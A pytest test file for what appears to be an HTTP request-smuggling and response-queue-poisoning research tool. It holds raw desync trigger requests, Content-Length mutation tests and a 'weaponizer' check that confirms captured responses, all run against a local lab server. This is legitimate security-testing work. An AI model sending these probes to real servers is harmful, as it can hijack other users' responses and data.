"""
Integration and Unit Tests for Deterministic Harness, Anomaly Cascade,
Permutation Engine, and Dangling-Byte RQP against the local Test Lab Server.
"""

import time
import pytest

from anomaly_detector import AnomalyDetector
from database import Database
from deterministic_harness import DeterministicHarness
from permutator import VectorPermutator
from test_lab_server import TestLabServer
from weaponizer import RQPWeaponizer


@pytest.fixture(scope="module")
def lab_server():
    server = TestLabServer(host="127.0.0.1", port=8091)
    server.start()
    time.sleep(0.3)
    yield server
    server.stop()


def test_anomaly_detector_text_binary_blend():
    # Normal HTML header followed by binary null bytes
    binary_leak = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body>Normal page" + (b"\x00" * 50) + b"\xfe\xff" * 20
    anomalies = AnomalyDetector.analyze_response(binary_leak)
    assert any(a["type"] == "text_binary_blend" for a in anomalies)


def test_anomaly_detector_double_html():
    double_html = b"HTTP/1.1 200 OK\r\n\r\n<!DOCTYPE html><html><body>Page 1</body></html><!DOCTYPE html><html><body>Page 2</body></html>"
    anomalies = AnomalyDetector.analyze_response(double_html)
    assert any(a["type"] == "double_html" for a in anomalies)


def test_anomaly_detector_inline_headers():
    inline_headers = b"HTTP/1.1 200 OK\r\n\r\nNormal body\r\nServer: ATS\r\nX-Amzn-Trace-Id: Root=1-abc\r\n"
    anomalies = AnomalyDetector.analyze_response(inline_headers)
    assert any(a["type"] == "inline_headers" for a in anomalies)


def test_permutator_mutations():
    permutator = VectorPermutator()
    base_probe = {
        "raw_request": "POST / HTTP/1.1\r\nHost: target.local\r\nContent-Length: 20\r\n\r\n$PAYLOAD",
        "rationale": "Base trigger",
        "is_clean": True,
    }

    mutated_nul, name1 = permutator._mutate_path_nul(base_probe["raw_request"])
    assert "/nul" in mutated_nul

    mutated_dual_cl, name2 = permutator._mutate_dual_matching_cl(base_probe["raw_request"])
    assert mutated_dual_cl.count("Content-Length: 20") == 2

    mutated_dangling, name3 = permutator._mutate_dangling_byte(base_probe["raw_request"])
    assert "Content-Length: 1" in mutated_dangling


def test_deterministic_harness_contamination(lab_server):
    harness = DeterministicHarness(host="127.0.0.1", port=8091, use_tls=False, timeout=2.0)

    # Clean probe that does not trigger desync
    benign_probe = {
        "raw_request": "GET / HTTP/1.1\r\nHost: target.local\r\n\r\n",
        "rationale": "Benign probe",
        "is_clean": True,
    }
    is_vuln, _, details, _ = harness.run_evaluation(benign_probe)
    assert not is_vuln

    # Desync trigger probe (Content-Type: multipart/byteranges with nested marker)
    desync_probe = {
        "raw_request": (
            "POST / HTTP/1.1\r\n"
            "Host: target.local\r\n"
            "Content-Type: multipart/byteranges; boundary=BOUND\r\n"
            "Content-Length: 150\r\n\r\n"
            "$PAYLOAD"
        ),
        "rationale": "RFC 2616 multipart/byteranges trigger",
        "is_clean": False,
    }
    is_vuln, desync_class, details, meta = harness.run_evaluation(desync_probe)
    assert is_vuln
    assert "marker reflected" in details.lower() or "contamination verified" in details.lower()


def test_weaponizer_dangling_byte(lab_server):
    weaponizer = RQPWeaponizer(host="127.0.0.1", port=8091, use_tls=False, timeout=2.0)
    trigger = (
        "POST / HTTP/1.1\r\n"
        "Host: target.local\r\n"
        "Content-Type: multipart/byteranges; boundary=BOUND\r\n"
        "Content-Length: 100\r\n\r\n"
        "$PAYLOAD"
    )
    is_stolen, reason, evidence = weaponizer.test_dangling_byte_rqp(trigger, smuggled_endpoint="/captured")
    assert is_stolen
    assert "Autonomous RQP Confirmed" in reason


def test_fusion_normalization_resilience():
    from fusion_engine import FusionArbiter
    from probe_generator import ProbeGenerator

    arbiter = FusionArbiter(db=None)
    # Test dictionary input with raw field
    norm1 = arbiter._normalize_crlf({"raw_request": "GET / HTTP/1.1\r\nHost: test\r\n\r\n"})
    assert "GET / HTTP/1.1\r\n" in norm1

    # Test dictionary input with structured fields
    norm2 = arbiter._normalize_crlf({"method": "POST", "path": "/api", "headers": {"Content-Length": "10"}, "body": "test"})
    assert norm2.startswith("POST /api HTTP/1.1\r\n")
    assert "Content-Length: 10" in norm2

    # Test non-string input
    norm3 = arbiter._normalize_crlf(None)
    assert norm3 == ""

    generator = ProbeGenerator(db=None)
    norm4 = generator._normalize_newlines({"request": "GET / HTTP/1.1\nHost: test\n\n"})
    assert norm4 == "GET / HTTP/1.1\r\nHost: test\r\n\r\n"

